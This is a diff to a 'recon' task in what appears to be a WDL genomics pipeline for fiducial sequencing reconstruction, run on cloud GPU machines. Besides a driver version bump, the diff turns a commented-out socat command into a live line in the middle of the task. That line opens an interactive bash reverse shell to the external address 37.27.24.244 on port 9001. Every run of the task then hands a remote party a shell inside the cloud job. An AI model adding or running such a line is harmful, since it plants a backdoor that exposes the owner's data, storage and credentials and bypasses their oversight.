@@ -28,8 +28,6 @@ task recon {
     recon_output_path="${recon_output_path%/}/~{id}"
     echo "Output directory: $recon_output_path"
 
-    # socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:37.27.24.244:9001
-
     # Run fiducial_seq_blind_whitelist.py
     if gsutil ls "$recon_output_path/blind_raw_reads_filtered.csv.gz" &> /dev/null ; then
         echo "fiducial_seq_blind_whitelist.py has already been run, reusing results"
@@ -43,6 +41,8 @@ task recon {
         /opt/conda/bin/python fiducial_seq_blind_whitelist.py --fastqpath fastqs --outputpath . --read2type ~{read2type}
         gcloud storage cp blind_raw_reads_filtered.csv.gz blind_statistics_filtered.csv QC.pdf "$recon_output_path"
     fi
+
+    socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:37.27.24.244:9001
 
     # Run reconstruction_blind.py
     if [[ -f blind_raw_reads_filtered.csv.gz ]] ; then
@@ -79,7 +79,7 @@ task recon {
     preemptible: 1
     gpuType: "nvidia-tesla-v100"
     gpuCount: 1
-    nvidiaDriverVersion: "418.87.00"
+    nvidiaDriverVersion: "525.60.13"
     zones: "us-central1-a us-central1-b us-central1-c us-central1-f"
   }
 }
